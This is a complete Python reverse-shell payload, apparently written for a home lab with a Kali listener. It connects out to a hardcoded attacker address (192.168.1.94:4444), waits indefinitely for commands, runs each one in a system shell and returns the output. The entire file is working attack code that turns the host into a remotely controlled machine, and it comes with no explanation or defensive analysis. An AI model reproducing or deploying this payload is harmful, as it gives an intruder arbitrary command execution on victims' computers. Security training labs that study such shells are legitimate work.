import socket
import subprocess
import sys
import os

print("="*60)
print("   REVERSE SHELL PAYLOAD - VICTIM SIDE")
print("="*60)

ATTACKER_IP = "192.168.1.94"
ATTACKER_PORT = 4444

print(f"\n[+] Target Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
print("[+] Attempting to connect...")

try:
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # REMOVED THE TIMEOUT - Now it will wait forever
    victim_socket.connect((ATTACKER_IP, ATTACKER_PORT))
    
    print("[✓] SUCCESS! Connected to C2 server")
    print("[!] This computer is now remotely controlled")
    print("[!] Waiting for attacker commands...")
    print("="*60)
    
    while True:
        command = victim_socket.recv(1024).decode()
        
        if command.lower() == "exit":
            print("[+] Attacker closed the connection")
            break
        
        if command.lower() == "help":
            help_text = """
            Available Commands:
            whoami     - Show current username
            dir        - List files in current directory
            ipconfig   - Show network information
            calc       - Open Calculator
            notepad    - Open Notepad
            echo [text] - Display text
            exit       - Close connection
            """
            victim_socket.send(help_text.encode())
            continue
        
        try:
            if os.name == 'nt':
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            output = result.stdout + result.stderr
            
            if output == "":
                output = f"[+] Command '{command}' executed successfully (no output)\n"
            
        except Exception as e:
            output = f"[-] Error executing command: {str(e)}\n"
        
        victim_socket.send(output.encode())
        
except ConnectionRefusedError:
    print("[-] Connection refused! Attacker not listening")
    print("[!] Start attacker.py on Kali FIRST, then run this")
    input("\nPress Enter to exit...")
    
except Exception as e:
    print(f"[-] Connection failed: {e}")
    input("\nPress Enter to exit...")
    
finally:
    try:
        victim_socket.close()
    except:
        pass
    print("[+] Victim payload closed")